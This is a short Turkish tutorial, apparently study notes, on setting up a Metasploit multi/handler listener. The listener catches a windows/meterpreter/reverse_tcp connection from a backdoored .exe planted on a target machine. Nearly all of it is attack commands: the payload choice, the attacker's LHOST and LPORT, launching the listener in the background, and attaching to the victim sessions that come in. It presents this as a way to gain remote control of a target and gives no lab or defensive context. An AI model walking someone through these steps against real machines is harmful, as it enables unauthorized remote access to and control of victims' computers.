- 💻 Hedef makineye **backdoor’lu `.exe` dosyası** yüklendikten sonra dinleme başlatılır.
---
### ⚙️ Handler Modülünü Açma

```bash
use exploit/multi/handler
```

- Dinleme için kullanılan özel modül ✅
---
### 🔍 Ayarları Görüntüleme

```bash
show options
```

- Mevcut payload ve ayarları listeler
---
### 🎯 Payload Seçimi

```bash
set payload windows/meterpreter/reverse_tcp
```

- 📡 **reverse_tcp** → hedef çalıştırdığında bize geri bağlanır
    
- 💠 **meterpreter** → gelişmiş kontrol imkanı sağlar
---
### 🌐 IP ve Port Ayarları

```bash
set LHOST <saldirgan_ip>
set LPORT 8080
```

- 🏠 **LHOST** → saldırganın IP adresi
    
- 🔌 **LPORT** → dinlenecek port (backdoor oluştururken verdiğin port ile aynı olmalı)
---
### 🚀 Dinlemeyi Başlatma

```bash
exploit -j -z
```

- 🔄 **-j** → arka planda çalıştır
    
- 💤 **-z** → session geldiğinde otomatik shell’e düşmeden bekle
---
### 🖥️ Oturum Yönetimi

- 📋 Açık oturumları görmek için:
```bash
sessions -l
```

- 🔗 Belirli bir oturuma bağlanmak için:
```bash
sessions -i 1
```
---
💡 **Özet:**

1. `use exploit/multi/handler` → dinleyici aç
    
2. `set payload ...` → payload belirle
    
3. `set LHOST / LPORT` → IP & port ayarla
    
4. `exploit -j -z` → dinleme başlat
    
5. Hedef çalıştırdığında → `sessions -l` & `sessions -i 1` ile erişim
---